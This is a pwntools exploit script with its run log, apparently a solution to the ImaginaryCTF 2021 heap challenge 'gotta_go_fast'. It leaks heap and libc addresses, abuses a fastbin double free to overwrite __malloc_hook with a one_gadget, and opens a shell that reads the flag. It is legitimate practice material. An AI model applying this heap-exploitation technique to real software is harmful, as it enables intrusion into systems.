# Local : Ubuntu 16.04
# Server: Ubuntu 16.04

from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './gotta_go_fast'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "chal.imaginaryctf.org"
  PORT = 42009
  s = remote(HOST, PORT)
  #libc = ELF('./libc-2.27.so')
else:
  s = process(BINARY)
  libc = elf.libc

def Draft(dist, pos, name):
  s.sendlineafter("> ", "0")
  s.sendlineafter("> ", str(dist))
  s.sendlineafter("> ", str(pos))
  s.sendlineafter("name?\n", name)

def Draft_noreturn(dist, pos, name):
  s.sendlineafter("> ", "0")
  s.sendlineafter("> ", str(dist))
  s.sendlineafter("> ", str(pos))
  s.sendafter("name?\n", name)

def Remove(idx):
  s.sendlineafter("> ", "1")
  s.sendlineafter("> ", str(idx))

def See():
  s.sendlineafter("> ", "2")

def Heap_leak(addr):
  s.sendlineafter("> ", "4")
  s.sendlineafter("need...\n", str(addr))

# heap leak
Heap_leak(elf.sym.head)
heap_leak = int(s.recvuntil("\n"), 16)
heap_base = heap_leak - 0x10
print "heap_leak =", hex(heap_leak)
print "heap_base =", hex(heap_base)

Draft(1, 1, (p64(0)+p64(0x71))*6)
Draft(1, 1, "AA")
Draft(1, 1, (p64(0)+p64(0x11))*6)

# Double free in fastbin
Remove(1)
Remove(0)
Remove(2)

Draft(1, 1, p64(heap_base + 0x390))
Draft(1, 1, "BB")
Draft(1, 1, "CC")

# libc leak
Draft(1, 1, "A"*0x10+p64(0x0001000100000000)+p64(0x91))
Remove(0)
See()

s.recvuntil("Tribute 2 [")
libc_leak = u64(s.recvuntil("]")[:-1]+b"\x00\x00")
libc_base = libc_leak - 0x3c4b78
malloc_hook = libc_base + 0x3c4b10
one_gadget_offset = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
one_gadget = libc_base + one_gadget_offset[2]
print "libc_leak =", hex(libc_leak)
print "libc_base =", hex(libc_base)

Draft(1, 1, "DD")
Draft(1, 1, "EE")
Draft(1, 1, "FF")

# Double free in fastbin
Remove(4)
Remove(3)
Remove(5)

# Set one_gadget in __malloc_hook 
Draft(1, 1, p64(malloc_hook - 0x23))
Draft(1, 1, "GG")
Draft(1, 1, "HH")
Draft(1, 1, "I"*0x13+p64(one_gadget))

# Start One gadget 
s.sendlineafter("> ", "0")

s.interactive()

'''
mito@ubuntu:~/CTF/ImaginaryCTF_2021/Pwn_Gotta_Go_Fast_400$ python solve.py r
[*] '/home/mito/CTF/ImaginaryCTF_2021/Pwn_Gotta_Go_Fast_400/gotta_go_fast'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
[+] Opening connection to chal.imaginaryctf.org on port 42009: Done
heap_leak = 0x1b5d010
heap_base = 0x1b5d000
libc_leak = 0x7fad7a822b78
libc_base = 0x7fad7a45e000
[*] Switching to interactive mode
$ id
uid=1000 gid=1000 groups=1000
$ ls -l
total 2876
-rw-r--r-- 1 nobody nogroup  879740 Jul 23 06:42 admin.zip
-rw-r--r-- 1 nobody nogroup      35 Jul 23 06:42 flag.txt
-rwxr-xr-x 1 nobody nogroup  162632 Jul 23 06:42 ld-2.23.so
-rwxr-xr-x 1 nobody nogroup 1868984 Jul 23 06:42 libc-2.23.so
-rwxr-xr-x 1 nobody nogroup   21312 Jul 23 06:42 run
$ cat flag.txt
ictf{s4n1c_w1ns_th3_hung3r_G4M3S!}
'''
